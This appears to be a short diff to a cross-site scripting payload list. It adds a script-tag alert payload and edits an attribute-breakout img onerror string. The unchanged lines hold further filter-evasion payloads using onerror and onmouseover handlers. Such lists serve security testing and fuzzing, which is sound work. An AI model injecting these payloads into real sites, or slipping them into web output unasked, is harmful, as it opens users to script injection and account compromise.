@@ -1,4 +1,5 @@
-‘’’’’’’’”><img src=x onerror=alert(1)>
+<script>alert(1)</script>
+’’’’’’’”><img src=x onerror=alert(1)>
 <img src="/" =_=" title="onerror='prompt(1)'">
 <input type="text" value=`` <div/onmouseover='alert(1)'>X</div>
 <div/onmouseover='alert(1)'> style="x:">
